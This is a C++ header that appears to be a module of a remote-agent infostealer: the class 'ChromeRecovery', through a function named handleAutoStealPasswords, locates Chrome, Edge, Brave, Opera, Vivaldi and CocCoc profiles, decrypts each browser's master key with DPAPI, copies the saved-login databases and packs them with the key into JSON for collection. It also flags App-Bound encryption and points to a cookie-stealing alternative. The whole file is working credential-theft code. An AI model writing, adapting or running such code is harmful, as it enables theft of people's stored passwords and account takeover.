#pragma once
#include <windows.h>
#include <dpapi.h>
#include <wincrypt.h>
#include <fstream>
#include <filesystem>
#include <vector>
#include <string>
#include <iostream>
#include <nlohmann/json.hpp>

#pragma comment(lib, "crypt32.lib")

using json = nlohmann::json;
namespace fs = std::filesystem;

class ChromeRecovery
{
private:
    static std::vector<BYTE> WinAPI_Base64Decode(const std::string &input)
    {
        DWORD dwSize = 0;
        if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64_ANY, NULL, &dwSize, NULL, NULL))
            return {};
        std::vector<BYTE> buffer(dwSize);
        if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64_ANY, buffer.data(), &dwSize, NULL, NULL))
            return {};
        return buffer;
    }

    static std::string WinAPI_Base64Encode(const BYTE *data, DWORD len)
    {
        DWORD dwSize = 0;
        if (!CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwSize))
            return "";
        std::string result(dwSize, 0);
        if (!CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &result[0], &dwSize))
            return "";
        if (!result.empty() && result.back() == '\0')
            result.pop_back();
        return result;
    }

    // Cấu trúc browser info
    struct BrowserInfo
    {
        std::string name;
        std::string localStatePath;
        std::string userDataPath;
    };

    static std::vector<BrowserInfo> getInstalledBrowsers()
    {
        std::vector<BrowserInfo> browsers;

        char *localAppData = nullptr;
        size_t len = 0;
        _dupenv_s(&localAppData, &len, "LOCALAPPDATA");
        if (!localAppData)
            return browsers;
        std::string appData(localAppData);
        free(localAppData);

        // Danh sách browser cần check
        std::vector<BrowserInfo> candidates = {
            {"Chrome", appData + "\\Google\\Chrome\\User Data\\Local State", appData + "\\Google\\Chrome\\User Data\\"},
            {"Edge", appData + "\\Microsoft\\Edge\\User Data\\Local State", appData + "\\Microsoft\\Edge\\User Data\\"},
            {"Brave", appData + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", appData + "\\BraveSoftware\\Brave-Browser\\User Data\\"},
            {"CocCoc", appData + "\\CocCoc\\Browser\\User Data\\Local State", appData + "\\CocCoc\\Browser\\User Data\\"},
            {"Opera", appData + "\\Opera Software\\Opera Stable\\Local State", appData + "\\Opera Software\\Opera Stable\\"},
            {"OperaGX", appData + "\\Opera Software\\Opera GX Stable\\Local State", appData + "\\Opera Software\\Opera GX Stable\\"},
            {"Vivaldi", appData + "\\Vivaldi\\User Data\\Local State", appData + "\\Vivaldi\\User Data\\"}};

        for (const auto &b : candidates)
        {
            if (fs::exists(b.localStatePath))
            {
                browsers.push_back(b);
                std::cout << "[AUTO] Found: " << b.name << "\n";
            }
        }

        return browsers;
    }

public:
    // Hàm này trả về Pair: {Status Code, Key/Error Message}
    // Status: 0 = OK, 1 = App-Bound (Fail), 2 = Error
    static std::pair<int, std::string> GetMasterKey(const std::string &localStatePath)
    {
        std::ifstream ifs(localStatePath, std::ios::binary);
        if (!ifs.is_open())
            return {2, "Local State not found"};

        json j;
        try
        {
            ifs >> j;
        }
        catch (...)
        {
            return {2, "JSON Parse Error"};
        }

        std::string encryptedKeyB64 = j["os_crypt"]["encrypted_key"];
        std::vector<BYTE> encryptedKey = WinAPI_Base64Decode(encryptedKeyB64);

        if (encryptedKey.size() < 5)
            return {2, "Key Invalid"};

        // --- KIỂM TRA HEADER ---
        // Header "DPAPI" -> Standard (Có thể giải mã)
        // Header "APPB"  -> App-Bound (Không thể giải mã từ Agent.exe)

        char header[5] = {0};
        memcpy(header, encryptedKey.data(), 4);
        std::string headerStr(header);

        if (headerStr == "APPB")
        {
            return {1, "APP-BOUND ENCRYPTION DETECTED (Cannot decrypt externally)"};
        }

        // Nếu là DPAPI (Standard), tiến hành giải mã
        DATA_BLOB in, out;
        in.pbData = encryptedKey.data() + 5;
        in.cbData = (DWORD)(encryptedKey.size() - 5);

        if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
        {
            std::string finalKey = WinAPI_Base64Encode(out.pbData, out.cbData);
            LocalFree(out.pbData);
            return {0, finalKey};
        }

        return {2, "CryptUnprotectData Failed"};
    }

    // Helper: Scan một browser cụ thể và trả về DB list
    static json scanBrowserForPasswords(const BrowserInfo &browser, const std::string &masterKey)
    {
        json dbList = json::array();

        try
        {
            if (!fs::exists(browser.userDataPath))
                return dbList;

            for (const auto &entry : fs::directory_iterator(browser.userDataPath))
            {
                if (!entry.is_directory())
                    continue;

                std::string profileName = entry.path().filename().string();
                std::string dbPath = entry.path().string() + "\\Login Data";

                if (!fs::exists(dbPath))
                    continue;

                // Lọc bớt file rác (<50KB)
                uintmax_t fsize = fs::file_size(dbPath);
                if (fsize < 50 * 1024)
                    continue;

                std::string tempPath = "temp_" + browser.name + "_" + profileName + ".db";
                if (CopyFileA(dbPath.c_str(), tempPath.c_str(), FALSE))
                {
                    std::ifstream ifs(tempPath, std::ios::binary | std::ios::ate);
                    if (ifs.is_open())
                    {
                        std::streamsize size = ifs.tellg();
                        ifs.seekg(0, std::ios::beg);
                        std::vector<BYTE> buffer(size);
                        ifs.read((char *)buffer.data(), size);
                        ifs.close();

                        dbList.push_back({{"profile", profileName},
                                          {"data", WinAPI_Base64Encode(buffer.data(), (DWORD)buffer.size())}});
                        std::cout << "[AUTO] Packed: " << browser.name << "/" << profileName << "\n";
                    }
                }
                std::remove(tempPath.c_str());
            }
        }
        catch (...)
        {
        }

        return dbList;
    }

public:
    // === AUTO DETECT VÀ LẤY PASSWORDS TỪ TẤT CẢ BROWSER ===
    static json handleAutoStealPasswords()
    {
        std::cout << "[AUTO] Starting auto password extraction...\n";

        std::vector<BrowserInfo> browsers = getInstalledBrowsers();

        if (browsers.empty())
        {
            return {{"type", "error"}, {"message", "No supported browsers found on this system."}};
        }

        json allResults = json::array();
        int totalFound = 0;
        int appBoundCount = 0;
        std::string appBoundBrowsers = "";

        for (const auto &browser : browsers)
        {
            std::cout << "[AUTO] Processing: " << browser.name << "...\n";

            // 1. Lấy Master Key
            auto [status, keyResult] = GetMasterKey(browser.localStatePath);

            if (status == 1)
            {
                // App-Bound - ghi nhận nhưng tiếp tục browser khác
                appBoundCount++;
                appBoundBrowsers += browser.name + ", ";
                std::cout << "[AUTO] " << browser.name << ": App-Bound Encryption (skipped)\n";
                continue;
            }

            if (status == 2 || keyResult.empty())
            {
                std::cout << "[AUTO] " << browser.name << ": Key Error - " << keyResult << "\n";
                continue;
            }

            // 2. Scan DB files
            json dbList = scanBrowserForPasswords(browser, keyResult);

            if (!dbList.empty())
            {
                allResults.push_back({{"browser", browser.name},
                                      {"master_key", keyResult},
                                      {"dbs", dbList}});
                totalFound += dbList.size();
            }
        }

        if (allResults.empty())
        {
            std::string msg = "No passwords found.";
            if (appBoundCount > 0)
            {
                msg += "\n\n⚠️ " + std::to_string(appBoundCount) + " browser(s) use App-Bound Encryption: " + appBoundBrowsers;
                msg += "\nThese cannot be decrypted externally. Use CDP method for cookies instead.";
            }
            return {{"type", "error"}, {"message", msg}};
        }

        std::cout << "[AUTO] Success! Found " << totalFound << " profile DBs from " << allResults.size() << " browsers\n";

        json response = {
            {"type", "passwords_auto_result"},
            {"browsers", allResults},
            {"total_profiles", totalFound}};

        if (appBoundCount > 0)
        {
            response["warning"] = std::to_string(appBoundCount) + " browser(s) skipped due to App-Bound Encryption: " + appBoundBrowsers;
        }

        return response;
    }
};